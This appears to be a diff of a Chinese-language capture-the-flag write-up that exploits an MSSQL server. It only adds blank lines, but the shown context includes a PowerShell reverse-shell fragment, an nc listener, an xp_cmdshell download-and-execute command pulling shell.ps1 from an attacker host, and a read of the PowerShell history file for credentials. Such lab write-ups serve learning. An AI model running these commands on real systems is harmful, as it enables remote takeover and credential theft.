@@ -78,6 +78,7 @@ grammar_cjkRuby: true
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847147868.png)
 
 可以看到里面有一个 `prod.dtsConfig` 文件，我们下载一下
+
 `get prod.dtsConfig`
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600847259590.png)
@@ -146,11 +147,13 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $c
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848857109.png)
 
 使用 `nc` 来监听刚刚设置的端口，我设置的是 443
+
 `sudo nc -lvnp 443`
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600848941236.png)
 
 然后执行系统命令来访问下载并执行文件
+
 `xp_cmdshell "powershell "IEX (New-ObjectNet.WebClient).DownloadString(\"http://10.10.14.29/shell.ps1\");"`
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849065273.png)
@@ -162,6 +165,7 @@ $client = New-Object System.Net.Sockets.TCPClient("10.10.14.3",443);$stream = $c
 反弹成功！
 
 查看一下文件
+
 `type C:\Users\sql_svc\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt`
 
 ![](https://raw.githubusercontent.com/MrHatSec/MrHatSec.github.io/assets/MrHat/1600849401803.png)
